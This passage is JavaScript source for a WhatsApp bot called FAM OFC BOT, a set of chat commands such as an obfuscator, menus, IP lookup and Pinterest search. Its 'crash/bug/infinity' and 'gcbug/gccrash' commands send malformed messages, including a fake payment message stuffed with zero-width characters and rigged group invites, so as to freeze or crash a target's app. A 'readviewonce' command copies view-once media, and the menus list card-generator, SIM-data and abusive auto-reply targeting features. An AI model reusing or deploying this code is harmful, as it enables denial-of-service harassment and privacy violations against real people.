  if (!isOwner) return famofcreply('❌ This feature is only for Owners!');

  let jsCode = '';
  let fileName = 'obfuscated.js';
  let isFile = false;

  // Check for different input methods
  if (text && text.trim()) {
    // Direct text input
    jsCode = text;
  } else if (m.quoted) {
    // Check if quoted message has text or is a document
    if (m.quoted.text) {
      jsCode = m.quoted.text;
    } else if (m.quoted.mtype === 'documentMessage' && m.quoted.msg && m.quoted.msg.fileName && m.quoted.msg.fileName.endsWith('.js')) {
      isFile = true;
      fileName = m.quoted.msg.fileName;
    } else if (m.quoted.mtype === 'extendedTextMessage' && m.quoted.msg?.text) {
      jsCode = m.quoted.msg.text;
    }
  } else if (m.mtype === 'documentMessage' && qmsg && qmsg.fileName && qmsg.fileName.endsWith('.js')) {
    // Document sent with command
    isFile = true;
    fileName = qmsg.fileName;
  }

  // If no code found, show usage
  if (!jsCode && !isFile) {
    return famofcreply(`📌 *Usage:* ${prefix}${command} <JavaScript code>\n`
      + `Or reply to a message containing JavaScript code with ${prefix}${command}\n`
      + `Or send/reply to a .js file with ${prefix}${command}`);
  }

  try {
    await WaSocket.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

    // Handle file download if needed
    if (isFile) {
      let filePath;
      if (m.quoted) {
        // Download quoted document
        filePath = await WaSocket.downloadAndSaveMediaMessage(m.quoted, `temp_${Date.now()}.js`);
      } else {
        // Download current document
        filePath = await WaSocket.downloadAndSaveMediaMessage(m, `temp_${Date.now()}.js`);
      }
      jsCode = fs.readFileSync(filePath, 'utf-8');
      fs.unlinkSync(filePath);
    }

    // Validate JavaScript code
    if (!jsCode.trim()) {
      return famofcreply('❌ No JavaScript code provided!');
    }

    // Obfuscate the code using javascript-obfuscator
    const JavaScriptObfuscator = require('javascript-obfuscator');
    const obfuscationResult = JavaScriptObfuscator.obfuscate(jsCode, {
      compact: true,
      controlFlowFlattening: true,
      controlFlowFlatteningThreshold: 0.75,
      deadCodeInjection: true,
      deadCodeInjectionThreshold: 0.4,
      debugProtection: false,
      debugProtectionInterval: 0,
      disableConsoleOutput: false,
      identifierNamesGenerator: 'hexadecimal',
      log: false,
      numbersToExpressions: true,
      simplify: true,
      shuffleStringArray: true,
      splitStrings: true,
      splitStringsChunkLength: 10,
      stringArray: true,
      stringArrayEncoding: ['base64'],
      stringArrayThreshold: 0.75,
      transformObjectKeys: true,
      unicodeEscapeSequence: false
    });

    const obfuscatedCode = obfuscationResult.getObfuscatedCode();

    // Determine output method based on code length
    const maxMessageLength = 4000;
    if (obfuscatedCode.length <= maxMessageLength) {
      // Send as text if within limit
      await WaSocket.sendMessage(m.chat, {
        text: `✅ *Obfuscated JavaScript Code*\n\n\`\`\`javascript\n${obfuscatedCode}\n\`\`\`\n\n📦 *Original Size:* ${formatSize(jsCode.length)}\n🔒 *Obfuscated Size:* ${formatSize(obfuscatedCode.length)}`,
        contextInfo: {
          externalAdReply: {
            title: 'FamOFC Bot',
            body: '🔒 JavaScript Obfuscation Complete',
            thumbnailUrl: 'https://fam-official.serv00.net/logo/famofc.jpg',
            mediaType: 1,
            renderLargerThumbnail: true,
            sourceUrl: 'https://famofc.site'
          },
        },
      }, { quoted: m });
    } else {
      // Save to file and send as document if too large
      const tmpFile = path.join(__dirname, `obfuscated_${Date.now()}_${fileName}`);
      fs.writeFileSync(tmpFile, obfuscatedCode);
      await WaSocket.sendMessage(m.chat, {
        document: fs.readFileSync(tmpFile),
        mimetype: 'application/javascript',
        fileName: `obfuscated_${fileName}`,
        caption: `✅ *Obfuscated JavaScript Code*\n\n📦 Original Size: ${formatSize(jsCode.length)}\n🔒 Obfuscated Size: ${formatSize(obfuscatedCode.length)}\n📁 File generated due to large code size.\n\n🔥 Powered by FAM OFC`,
        contextInfo: {
          externalAdReply: {
            title: 'FamOFC Bot',
            body: '🔒 JavaScript Obfuscation Complete',
            thumbnailUrl: 'https://fam-official.serv00.net/logo/famofc.jpg',
            mediaType: 1,
            renderLargerThumbnail: true,
            sourceUrl: 'https://famofc.site'
          },
        },
      }, { quoted: m });
      fs.unlinkSync(tmpFile);
    }

    await WaSocket.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
  } catch (err) {
    console.error('Obfuscate Command Error:', err);
    await famofcreply(`❌ Failed to obfuscate code.\nError: ${err.message}\n\n🔥 Powered by FAM OFC`);
    await WaSocket.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
  }
}
break;
  case "malik": {
    await WaSocket.sendMessage(m.chat, { audio: maliksong, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
    }
break;
case "sigma": {
await WaSocket.sendMessage(m.chat, { audio: sigmasong, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;

  
  case 'crash':
case 'bug':
case 'infinity': {
    if (!isOwner) return famofcreply("❌ Only the Owner can use this command!");
    if (!text) return famofcreply(`📌 *Usage:* ${prefix + command} <number>|<amount>\nExample: ${prefix + command} 923001234567|3`);
    
    try {
        await WaSocket.sendMessage(m.chat, { react: { text: '💣', key: m.key } });
        
        // Parse input: number|amount
        const parts = text.split('|');
        const targetNumber = parts[0].trim();
        const amount = parseInt(parts[1]) || 1; // Default 1 cycle (2 messages per cycle)
        
        if (amount > 10) return famofcreply(`❌ *Maximum 10 cycles allowed!* (20 total messages)\n\n🔥 *Powered by FAM OFC*`);
        
        let targetJid = targetNumber.includes('@') ? targetNumber : targetNumber + '@s.whatsapp.net';
        
        // Check if target is valid
        if (!targetJid.includes('@s.whatsapp.net')) {
            return famofcreply(`❌ *Invalid target!* Please provide a valid WhatsApp number.\n\n🔥 *Powered by FAM OFC*`);
        }
        
        // Send processing message
        const processingMsg = await m.reply(`💣 *Sending crash messages to:* ${targetJid}\n` +
                                            `🔄 Cycles: ${amount} (${amount*2} total messages)\n` +
                                            `⏳ Please wait...`);
        
        // Send crash messages using the exact function you provided
        await sendCrashMessages(targetJid, amount);
        
        // Update result
        await WaSocket.sendMessage(m.chat, { 
            text: `✅ *Crash Attack Completed!*\n\n` +
                  `📱 Target: ${targetJid}\n` +
                  `💣 Cycles sent: ${amount}\n` +
                  `📨 Total messages: ${amount * 2}\n` +
                  `🎯 Type: Malformed WhatsApp packets\n\n` +
                  `*Technical Details:*\n` +
                  `1. View-once malformed interactive message\n` +
                  `2. Fake payment with 1500 zero-width chars\n\n` +
                  `*Expected Effects:*\n` +
                  `• App parsing/rendering bugs\n` +
                  `• Memory allocation issues\n` +
                  `• UI lag/freezes\n` +
                  `• Potential WhatsApp crash\n\n` +
                  `🔥 *Powered by FAM OFC*`,
            edit: processingMsg.key 
        });
        
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error("Crash command error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famofcreply(`❌ *Error:* ${error.message}\n\n🔥 *Powered by FAM OFC*`);
    }
}
break;
  case "trackip": {
    if (!text) {
        return famofcreply(`📌 *Usage:* ${prefix + command} <IP address>\nExample: ${prefix + command} 112.90.150.204\n\n🔥 *Powered by FAM OFC*`);
    }

    // Validate IP address format
    const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    if (!ipRegex.test(text)) {
        return famofcreply(`❌ *Invalid IP Address:* Please provide a valid IPv4 address (e.g., 112.90.150.204)\n\n🔥 *Powered by FAM OFC*`);
    }

    try {
        // Send loading reaction
        await WaSocket.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

        // Fetch IP information
        const res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

        if (!res || !res.success) {
            throw new Error(`IP ${text} not found or invalid!`);
        }

        // Formatting the IP information response
        const formatIPInfo = (info) => {
            return `🎩 *𝐅𝐀𝐌 𝐎𝐅𝐂 - 𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑*\n\n` +
                   `📍 *IP Address:* ${info.ip || 'N/A'}\n` +
                   `✅ *Valid:* ${info.success ? 'Yes ✅' : 'No ❌'}\n` +
                   `🌍 *Type:* ${info.type || 'N/A'}\n` +
                   `🗺️ *Continent:* ${info.continent || 'N/A'} (${info.continent_code || 'N/A'})\n` +
                   `🏳️ *Country:* ${info.country || 'N/A'} (${info.country_code || 'N/A'})\n` +
                   `🏙️ *Region:* ${info.region || 'N/A'} (${info.region_code || 'N/A'})\n` +
                   `🌆 *City:* ${info.city || 'N/A'}\n` +
                   `📌 *Latitude:* ${info.latitude || 'N/A'}\n` +
                   `📌 *Longitude:* ${info.longitude || 'N/A'}\n` +
                   `🌐 *Is EU:* ${info.is_eu ? 'Yes 🇪🇺' : 'No 🌍'}\n` +
                   `📮 *Postal Code:* ${info.postal || 'N/A'}\n` +
                   `📞 *Calling Code:* +${info.calling_code || 'N/A'}\n` +
                   `🏛️ *Capital:* ${info.capital || 'N/A'}\n` +
                   `🗺️ *Borders:* ${Array.isArray(info.borders) && info.borders.length > 0 ? info.borders.join(", ") : 'None'}\n\n` +
                   `🚀 *Connection Details:*\n` +
                   `🔹 *ASN:* ${info.connection?.asn || 'N/A'}\n` +
                   `🏢 *Organization:* ${info.connection?.org || 'N/A'}\n` +
                   `📡 *ISP:* ${info.connection?.isp || 'N/A'}\n` +
                   `🌎 *Domain:* ${info.connection?.domain || 'N/A'}\n\n` +
                   `⏰ *Timezone:* ${info.timezone?.id || 'N/A'} (${info.timezone?.abbr || 'N/A'})\n` +
                   `🕒 *Current Time:* ${info.timezone?.current_time || 'N/A'}\n` +
                   `⏱️ *UTC Offset:* ${info.timezone?.utc || 'N/A'}\n\n` +
                   `🎯 *Accuracy:* ${info.accuracy || 'N/A'}\n` +
                   `🔄 *Last Updated:* ${new Date().toLocaleString()}\n\n` +
                   `🔥 *Powered by FAM OFC*`;
        };

        // Send location pin if latitude & longitude exist
        if (res.latitude && res.longitude) {
            await WaSocket.sendMessage(m.chat, {
                location: { 
                    degreesLatitude: res.latitude, 
                    degreesLongitude: res.longitude,
                    name: `${res.city || 'Location'} - ${res.country || ''}`,
                    address: `${res.city || ''}, ${res.region || ''}, ${res.country || ''}`
                }
            }, { quoted: m });
        }

        // Send IP details
        const ipInfo = formatIPInfo(res);
        
        // Send as interactive message with copy button
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        body: { text: ipInfo },
                        footer: { text: "📍 Location sent above if available" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📋 Copy IP Info",
                                        copy_code: ipInfo
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { quoted: m });

        await WaSocket.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
        
        // Send success reaction
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error("TrackIP Command Error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famofcreply(`❌ *Error:* Unable to track IP ${text}\n${error.message || "Invalid IP or API issue."}\n\n🔥 *Powered by FAM OFC*`);
    }
}
break;
case "gcbug":
case "gccrash": {
if (!isOwner) return famofcreply("❌ Only the Owner can use this command!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} Link\nExample: ${prefix + command} https://chat.whatsapp.com/FuLRVI2SGNd4bnWlPsEt`);

    let result = args[0].split('https://chat.whatsapp.com/')[1];
    let Pehssjsjsj = await WaSocket.groupAcceptInvite(result);
    jumlah = "3";

    for (let i = 0; i < jumlah; i++) {
        var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
            "groupInviteMessage": {
                "groupJid": "120363251190676308@g.us",
                "inviteCode": "/RwWifkIpEQUesVv",
                "inviteExpiration": "1709614188",
                "groupName": `${teksbug2}`,
                "caption": "Yahaha Lag Ya?!"
            }
        }), { userJid: from, quoted: m });

        WaSocket.relayMessage(Pehssjsjsj, groupInviteMessage.message, { messageId: groupInviteMessage.key.id });
    }

    // Adding credit
    m.reply(`✅ Successfully sent the bug!\n\n🔹 *Credit: FAM OFC*`);
}
break;


case "clean": {
    if (!isOwner) return famofcreply("❌ Only the Owner can use this command!");
    try {
        let sessionFolder = "./session";
        let excludedFile = "creds.json";
        await WaSocket.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        if (fs.existsSync(sessionFolder)) {
            let files = fs.readdirSync(sessionFolder);
            let deletedFiles = 0;
            for (let file of files) {
                let filePath = path.join(sessionFolder, file);
                if (fs.lstatSync(filePath).isFile() && file !== excludedFile) {
                    fs.unlinkSync(filePath);
                    deletedFiles++;
                }
            }
            await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            famofcreply(`✅ *Successfully deleted ${deletedFiles} session files!*\n⚠ *creds.json is kept safe.*\n\n🔥 *Powered by FAM OFC*`);
        } else {
            await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            famofcreply("❌ *Session folder not found!*\n\n🔥 *Powered by FAM OFC*");
        }
    } catch (error) {
        console.error("Error Cleaning Sessions:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        famofcreply(`⚠ *Error cleaning session files.* ${error.message}\n\n🔥 *Powered by FAM OFC*`);
    }
}
break;

case "kick": {
    if (!isGroup) return famofcreply("❌ *This command can only be used in groups!*");
    if (!isBotAdmins) return famofcreply("❌ *I need to be an admin to kick members!*");
    if (!isAdmins && !isOwner) return famofcreply("❌ *Only group admins or the bot owner can use this command!*");
    if (!m.quoted) return famofcreply("📌 *Usage:* Reply to a member's message with `.kick` to remove them.");
    
    const target = m.quoted.sender;
    if (groupAdmins.includes(target)) return famofcreply("❌ *Cannot kick a group admin!*");
    if (target === botNumber) return famofcreply("❌ *I cannot kick myself!*");

    try {
        await WaSocket.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });
        await WaSocket.groupParticipantsUpdate(from, [target], "remove");
        
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        await famofcreply(`✅ *Kicked @${target.split('@')[0]} from the group!*\n\n🔥 *Powered by FAM OFC*`, {
            mentions: [target]
        });
    } catch (error) {
        console.error("Kick Command Error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famofcreply(`❌ *Error:* Failed to kick the member. ${error.message}\n\n🔥 *Powered by FAM OFC*`);
    }
}
break;

case 'rvo':
case 'readviewonce':
case 'vv': {
    if (!quoted) return famofcreply(`❌ *Reply to a view-once message with* ${prefix}${command}\n\n🔥 *Powered by FAM OFC*`);
    await WaSocket.sendMessage(m.chat, { react: { text: "🕒", key: m.key } });
    try {
        let mimeType = quoted.mtype || quoted.msg?.mimetype || qmsg.mimetype || quoted.mimetype;
        const isViewOnce = mimeType.includes('viewOnce') || quoted.msg?.viewOnce || quoted.viewOnce;
        if (!isViewOnce) return famofcreply(`❌ *Not a view-once message!*\n\n🔥 *Powered by FAM OFC*`);
        let mediaType = "";
        if (mimeType.includes('image') || quoted.msg?.imageMessage || quoted.imageMessage) mediaType = "image";
        else if (mimeType.includes('video') || quoted.msg?.videoMessage || quoted.videoMessage) mediaType = "video";
        else if (mimeType.includes('audio') || quoted.msg?.audioMessage || quoted.audioMessage) mediaType = "audio";
        if (!mediaType) return famofcreply(`❌ *Unsupported media type!*\n\n🔥 *Powered by FAM OFC*`);
        let mediaBuffer = await WaSocket.downloadMediaMessage(quoted);
        if (!mediaBuffer || mediaBuffer.length === 0) return famofcreply(`❌ *Failed to download media.*\n\n🔥 *Powered by FAM OFC*`);
        let messageOptions = {};
        if (mediaType === "audio") {
            messageOptions.audio = mediaBuffer;
            messageOptions.mimetype = "audio/mp4";
            messageOptions.ptt = true;
        } else if (mediaType === "image") {
            messageOptions.image = mediaBuffer;
            if (text) messageOptions.caption = text;
        } else if (mediaType === "video") {
            messageOptions.video = mediaBuffer;
            if (text) messageOptions.caption = text;
        }
        messageOptions.contextInfo = {
            isForwarded: true,
            forwardingScore: 256,
            externalAdReply: {
                showAdAttribution: true,
                title: "Read View Once",
                body: `by 𝕱𝖆𝖒𝖔𝖋𝖈 𝖂𝖆𝖇𝖔𝖙`,
                thumbnailUrl: "https://fam-official.serv00.net/logo/famofc.jpg",
                sourceUrl: "https://famofc.site",
                mediaType: 1,
                renderLargerThumbnail: false
            }
        };
        await WaSocket.sendMessage(m.chat, messageOptions, { quoted: m });
        await WaSocket.sendMessage(WaSocket.user.id, messageOptions, { quoted: m });
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error("RVO Error:", err);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famofcreply(`❌ *Error:* ${err.message || "Failed"}\n\n🔥 *Powered by FAM OFC*`);
    }
}
break;
  case "allmenu": {
    
await WaSocket.sendMessage(m.chat, { react: { text: '⚠️', key: m.key } });
    const cards = []

    // helper image function
    async function getImage(url) {
        const { imageMessage } = await generateWAMessageContent(
            { image: { url } },
            { upload: WaSocket.waUploadToServer }
        )
        return imageMessage
    }

    // 🔹 CARD 1 – MAIN & INFO
    cards.push({
        header: {
            imageMessage: await getImage("https://fam-official.serv00.net/logo/bot.png"),
            hasMediaAttachment: true
        },
        body: {
            text:
`🤖 *MAIN & INFO MENU*

▢ ${prefix}menu
▢ ${prefix}ping
▢ ${prefix}runtime
▢ ${prefix}systeminfo
▢ ${prefix}trackip
▢ ${prefix}info
▢ ${prefix}meid
▢ ${prefix}tsid
▢ ${prefix}friends
▢ ${prefix}script`
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Open Main",
                        id: "menu"
                    })
                }
            ]
        }
    })

    // 🔹 CARD 2 – DATABASE & TOOLS
    cards.push({
        header: {
            imageMessage: await getImage("https://fam-official.serv00.net/logo/bot.png"),
            hasMediaAttachment: true
        },
        body: {
            text:
`🔍 *DATABASE & TOOLS*

▢ ${prefix}sim / simdata
▢ ${prefix}gen / gencc
▢ ${prefix}pin / pinterest
▢ ${prefix}idch / cekidch
▢ ${prefix}rvo / readviewonce`
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Open Database",
                        id: "sim"
                    })
                }
                
            ]
        }
    })

    // 🔹 CARD 3 – GROUP MANAGEMENT
    cards.push({
        header: {
            imageMessage: await getImage("https://fam-official.serv00.net/logo/bot.png"),
            hasMediaAttachment: true
        },
        body: {
            text:
`👥 *GROUP MANAGEMENT*

▢ ${prefix}kick
▢ ${prefix}invtag
▢ ${prefix}clean (Owner Only)`
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Group Tools",
                        id: "menu"
                    })
                }
            ]
        }
    })

    // 🔹 CARD 4 – OWNER & ADMIN
    cards.push({
        header: {
            imageMessage: await getImage("https://fam-official.serv00.net/logo/bot.png"),
            hasMediaAttachment: true
        },
        body: {
            text:
`👑 *OWNER & ADMIN*

▢ ${prefix}clean
▢ ${prefix}friends
▢ ${prefix}info
▢ ${prefix}meid
▢ ${prefix}tsid
▢ > (eval command)`
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Owner Website",
                        url: "https://famofc.site"
                    })
                }
            ]
        }
    })
     // 🔹 CARD 5 – bug
    cards.push({
        header: {
            imageMessage: await getImage("https://fam-official.serv00.net/logo/bot.png"),
            hasMediaAttachment: true
        },
        body: {
            text:
`😈 *BUG MENU*

▢ ${prefix}bug
▢ ${prefix}infinity
▢ ${prefix}crash 
▢ ${prefix}gcbug
▢ ${prefix}gccrash`
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "BUG MENU",
                        id: "bug"
                    })
                }
            ]
        }
    })
     // 🔹 CARD 6 – auto reply 
    cards.push({
        header: {
            imageMessage: await getImage("https://fam-official.serv00.net/logo/bot.png"),
            hasMediaAttachment: true
        },
        body: {
            text:
`😈 *Gali Auto reply*

▢ ${prefix}addtarget
▢ ${prefix}removetarget
▢ ${prefix}targetlist
▢ ${prefix}cleartargets
▢ ${prefix}autoreplystatus
▢ ${prefix}banlist
▢ ${prefix}unbanuser`
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "BUG MENU",
                        id: "bug"
                    })
                }
            ]
        }
    })

    // send carousel menu
    const msg = generateWAMessageFromContent(
        m.chat,
        {
            interactiveMessage: {
                body: {
                    text: `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
                },
                footer: {
                    text: "🔥 Powered by FAM OFC | Swipe left/right for more commands"
                },
                carouselMessage: {
                    cards,
                    messageVersion: 1
                }
            }
        },
        { quoted: m }
    )

    await WaSocket.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break

case 'pin':
case 'pinsrc':
case 'pinimg':
case 'pinimage':
case 'pinterest': {
    try {
        // Check for query
        if (!text) {
            await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return famofcreply('📌 *Usage:* .pin <keyword>\nExample: .pin cat\n\n🔥 *Powered by FAM OFC*');
        }

        // Send loading reaction
        await WaSocket.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        // Fetch Pinterest data
        const res = await fetch(`https://berak.vercel.app/search/pin?q=${encodeURIComponent(text)}`);
        const json = await res.json();

        if (!json.status || !json.result.length) {
            await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return famofcreply(`❌ *Error:* No results found for *${text}*.\n\n🔥 *Powered by FAM OFC*`);
        }

        // Take up to 5 results
        const hasil = json.result.slice(0, 5);
        const cards = [];

        // Function to generate image message
        async function image(url) {
            const { imageMessage } = await generateWAMessageContent({
                image: { url }
            }, {
                upload: WaSocket.waUploadToServer
            });
            return imageMessage;
        }

        // Build carousel cards
        for (let item of hasil) {
            cards.push({
                header: {
                    imageMessage: await image(item.image),
                    hasMediaAttachment: true
                },
                body: {
                    text: `## *${item.fullname || 'Unknown'}*\n` +
                          `> 👤 Uploaded by: ${item.upload_by || 'Unknown'}\n` +
                          `> 👥 Followers: ${item.followers || '0'}\n\n` +
                          `${item.caption || '_No caption_'}`,
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "🌐 Pinterest Source",
                            url: item.source || 'https://www.pinterest.com',
                            webview_presentation: null
                        })
                    }]
                }
            });
        }

        // Generate and send carousel message
        const msg = generateWAMessageFromContent(m.chat, {
            interactiveMessage: {
                body: {
                    text: `🔎 Search Results: *${text}*\n\n🔥 *Powered by FAM OFC*`
                },
                footer: {
                    text: `© ${global.namaOwner || "Faheem"}`
                },
                carouselMessage: {
                    cards,
                    messageVersion: 1
                }
            }
        }, {});

        await WaSocket.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

        // Send success reaction
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (error) {
        console.error("Pinterest Command Error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famofcreply(`❌ *Error:* Failed to load results from Pinterest. ${error.message || "Try again later."}\n\n�fire: *Powered by FAM OFC*`);
    }
}
break;
  case "ping": {
    const start = Date.now()

    await WaSocket.sendMessage(m.chat, {
        react: { text: "🏓", key: m.key }
    })

    const end = Date.now()
    const ping = end - start

    WaSocket.sendMessage(m.chat, {
        text: `🏓 *PONG!*\n\n⚡ Speed : *${ping} ms*\n🧠 Status : ${ping < 200 ? "Fast 🚀" : ping < 500 ? "Normal 🙂" : "Slow 🐢"}`,
        
    }, { quoted: x })
}
break;

/*
case "allmenu": {
    try {
        // Send loading reaction
        await WaSocket.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        // Define info section
        let pan = `
🔥 *FAM OFC BOT - ALL MENU* 🔥
`;

        // Send menu as simple text with buttons (بدلے میں)
        const menuText = `

╭───〔 📜 *COMMAND MENU* 〕
│ ▢ .menu
│ ▢ .systeminfo
│ ▢ .friends
│ ▢ .sim
│ ▢ .simdata
│ ▢ .cnic
│ ▢ .gen
│ ▢ .gencc
│ ▢ .info
│ ▢ .meid
│ ▢ .tsid
│ ▢ .invtag
╰───────────────

🔥 *Powered by FAM OFC*
`;

        // Send image with caption as interactive message
        await WaSocket.sendMessage(m.chat, {
            image: { url: "https://fam-official.serv00.net/logo/img.jpg" }, // آپ اپنی تصویر کا URL استعمال کریں
            caption: menuText,
            footer: "© Faheem",
            buttons: [
                { buttonId: '.menu', buttonText: { displayText: '📋 Basic Menu' }, type: 1 },
                { buttonId: '.simdata', buttonText: { displayText: '📱 Sim Data' }, type: 1 },
                { buttonId: '.pin', buttonText: { displayText: '📌 Pinterest' }, type: 1 }
            ],
            headerType: 1
        }, { quoted: x });

        // Send success reaction
        await WaSocket.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (error) {
        console.error("AllMenu Command Error:", error);
        await WaSocket.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famofcreply(`❌ *Error:* Failed to display menu. ${error.message || "Try again later."}\n\n🔥 *Powered by FAM OFC*`);
    }
}
break; */
            case "runtime": {
    let uptime = process.uptime();
    let hours = Math.floor(uptime / 3600);
    let minutes = Math.floor((uptime % 3600) / 60);
    let seconds = Math.floor(uptime % 60);
    
    await WaSocket.sendMessage(m.chat, { 
        pollResultMessage: { 
            name: "Runtime Info", 
            pollVotes: [
                {
                    optionName: "Runtime (Hours)",
                    optionVoteCount: hours
                },
                {
                    optionName: "Runtime (Minutes)",
                    optionVoteCount: minutes
                },
                {
                    optionName: "Runtime (Seconds)",
                    optionVoteCount: seconds
                }
            ],
            newsletter: {
                newsletterJid: "120363419700263280@newsletter", 
                newsletterName: "Famofc | Runtime Information"
            }
        } 
    }, { quoted: x });
}
break;
            case "script":
            case "sc": {
                await WaSocket.sendMessage(m.chat,{
                    productMessage: {
                        title: "pak FAM bot",
                        description: "hello everyone fam bot is here",
                        thumbnail: { url: "https://fam-official.serv00.net/logo/img.jpg" },
                        productId: "PROD001",
                        retailerId: "RETAIL001",
                        url: "https://github.com/famofc",
                        body: "the script is here",
                        footer: { text: "🔥 Powered by FAM OFC" },
                        priceAmount1000: 777,
                        currencyCode: "IDR",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "GitHub",
                                    url: "https://github.com/famofc"
                                })
                            }
                        ]
                    }
                }, { quoted: x });
            }
            break;
            
     case "menu": {
    await WaSocket.sendMessage(m.chat, { react: { text: '⚠️', key: m.key } });
      const teks = `
╭━━━━❦︎│⃟⭕➢𝐕11━━━━╮
┃ ╭━━━━━━━━━━━━╮
┃ ┃ ╭┈───────│⃟⭕➢
┃ ┃ │𝐌𝐄𝐍𝐔_𝐌𝐀𝐈𝐍
┃ ┃ ╰┈───────│⃟⭕➢
┃ ╰━━━━━━━━━━━━╯
╭━━✪ ❦︎│⃟⭕➢𝐕11 ✪━━╮
┃│⃟𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗘𝗗𝗜𝗧𝗜𝗢𝗡│⃟⭕➢
┃╭━━━━━━━━│⃟⭕➢
┃︎│⃟⭕➢𝐁𝐎𝐓 𝐈𝐍𝐅𝐎
┃┣━━━━━━━━│⃟⭕➢
┃│⃟📛➢ Name: FAM OFC BOT
┃│⃟👑➢ Owner: +923350963366
┃│⃟⚡➢ Prefix: ${prefix}
┃│⃟🕐➢ Time: ${time}
┃│⃟👤➢ User: ${m.pushName}
┃╰━━━━━━━━│⃟⭕➢
┣━━━━━━━━│⃟⭕➢
┃╭━━━━━━━━━╾•
┃┃ ⚠️ INFO_MENU ⚠️ 
┃╰━━━━━━━━━╾•
┃╭━━━━━━━━━╾•
┃┃│⃟🚫➢ ${prefix}ping
┃┃│⃟🚫➢ ${prefix}runtime
┃┃│⃟🚫➢ ${prefix}systeminfo
┃┃│⃟🚫➢ ${prefix}info
┃┃│⃟🚫➢ ${prefix}meid
┃┃│⃟🚫➢ ${prefix}tsid
┃┃│⃟🚫➢ ${prefix}script
┃╰━━━━━━━━│⃟⭕➢
┃╭━━━━━━━━━╾•
┃┃ ⚠️ AUTO_REPLY_MENU ⚠️ 
┃╰━━━━━━━━━╾•
┃╭━━━━━━━━━╾•
┃┃│⃟🚫➢ ${prefix}addtarget
┃┃│⃟🚫➢ ${prefix}removetarget
┃┃│⃟🚫➢ ${prefix}targetlist
┃┃│⃟🚫➢ ${prefix}cleartargets
┃┃│⃟🚫➢ ${prefix}autoreplystatus
┃┃│⃟🚫➢ ${prefix}banlist
┃┃│⃟🚫➢ ${prefix}unbanuser
┃╰━━━━━━━━│⃟⭕➢
┃╭━━━━━━━━━╾•
┃┃ ⚠️ DATABASE_MENU ⚠️ 
